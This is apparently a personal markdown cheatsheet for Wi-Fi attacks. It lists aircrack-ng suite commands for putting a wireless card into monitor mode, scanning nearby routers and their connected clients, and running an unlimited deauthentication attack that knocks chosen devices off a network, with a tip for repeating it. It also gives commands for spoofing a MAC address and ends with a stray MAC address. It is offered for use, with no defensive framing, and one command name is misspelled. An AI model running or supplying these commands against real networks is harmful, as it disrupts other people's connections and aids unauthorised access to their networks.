# Cheatsheet for hacking stuff

## Networking stuff

### Show my wireless card name
`iwconfig`

### Put wireless card on monitor mode
`airmon-ng start {card name}`

### Show routers in range
`airdump-ng {card name}`
- PWR column is showing signal strenght
- Note also the channel and BSSID of the router

### Show devices connected to a specific router
`airodump-ng {card name} --bssid {router BSSID} --channel {router channel}`
- router is also included there

### Create deauth attack
`aireplay-ng --deauth 0 -c {devices MAC} -a {routers MAC ADDRESS} {card name}`
- possibility to include more routers and more MAC adresses
- 0 means infinite number of deauth messages
- TIP of the day: put for example 50 insted of 0 and replay it with 1 second delay

### Change MAC address
```
sudo ifconfig {interface} down
sudo ifconfig {interface} hw ether {MAC address}
sudo ifconfig {interface} up
```

F4:A9:97:8B:29:DB